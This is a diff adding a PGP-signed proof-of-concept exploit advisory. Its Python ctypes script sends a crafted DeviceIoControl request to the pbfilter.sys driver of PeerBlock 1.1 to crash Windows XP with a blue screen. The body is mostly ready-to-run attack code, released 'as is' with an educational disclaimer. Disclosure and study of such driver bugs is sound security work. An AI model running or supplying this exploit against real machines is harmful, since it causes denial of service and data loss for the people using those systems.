@@ -1,0 +1,72 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+=======================================================================================================
+=======================================================================================================
+ PeerBlock 1.1 BSOD
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.altervista.org/
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on:
+ Microsoft Windows XP Professional
+ 5.1.2600 Service Pack 3 Build 2600
+ X86-based PC
+
+ Info:
+ PoC released as is, I have no time at the moment for further investigations
+
+- -----------------------------------------------------------------------
+ FILE INFO: (http://www.peerblock.com/)
+- -----------------------------------------------------------------------
+ File:             C:\Program Files\PeerBlock\pbfilter.sys
+ MD5 hash:         2f6e885c432927a186c2e352c8a1cbf4
+==============================================================================================================================
+==============================================================================================================================
+
+ Proof of concept:
+
+ from ctypes import *
+ 
+ kernel32 = windll.kernel32
+ Psapi    = windll.Psapi
+ 
+ if __name__ == '__main__':
+     GENERIC_READ  = 0x80000000
+     GENERIC_WRITE = 0x40000000
+     OPEN_EXISTING = 0x3
+     CREATE_ALWAYS = 0x2
+ 
+     SYM_NAME   = "\\\\.\\pbfilter"
+     dwReturn      = c_ulong()
+     out_buff      = "A" * 4000
+     in_buff       = ("")
+ 
+     handle = kernel32.CreateFileA(SYM_NAME, GENERIC_READ | GENERIC_WRITE,0, None, CREATE_ALWAYS, 0, None)
+     dev_ioct = kernel32.DeviceIoControl(handle, 0xabab, in_buff,len(in_buff), out_buff, len(out_buff),byref(dwReturn), None)
+
+==============================================================================================================================
+==============================================================================================================================
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.11 (MingW32)
+
+iQIcBAEBAgAGBQJPM5D3AAoJEJfnJLqVA1kXbmwP/AhtZQ9aRnnfBLK4CmvNEorj
+fhacEfnsf95dcGkHB7UDPmUR/vPsOFHzXDNzKQbzV0RAOK8zPDnXWP8X2I8rEnUx
+a1ULw0wwo/07R2n4UvbqVDE5Pw3L2ZM9OEBvbg/SmEmPTYmFLXRkl/qwrruOp2be
+UJN5Bm8rjOZl9SaOEMb++cdaU1ieKJIsphNPeH7sOpkg3atBmBaJYzCL/Px66/QB
+CqjanfugZP6kn6fUo3rbM0LtzHOlMzP/ZCQl5EYK/G98N6YzD9wOuZV4L3foPG6a
+8dJg7VpNA+umiKgqQ8iIVb0dvPJy46nn0p9bmcqbyil8S98SHaiqIx5QYyLt1jsG
+PVxAhWk0ec0HXAGgBv2vwKMWy85/BhI7ermaoMIHo+fUFjjgu4L3WRwv+E4mZuQD
+zUBn/KV6GpWas/zPD41AHWPz0P89V0IMtK5w2DKAejCBoxGyUkNbjBnBClfRmRAL
+wukua8ZPp5htGUQomjpjrZIu3d+EtWIG2dFKmUNByUfc3z4anY0MU8Cf+dKOduG4
+reNP52yJzbcxdxrAVA/GazE5QhqR0eLIf/oq27Lm1Zma/ZRD1B6h50W5nX8zOgzd
+CW5S6xKQpQRytRDfqrGhYAnaHnGlGTmmhQ4rW9twiV8Ygn6Rz8SM9KmkTzM2P55t
++PizKEH12PrXQX8t3GNc
+=Sbvp
+-----END PGP SIGNATURE-----
+
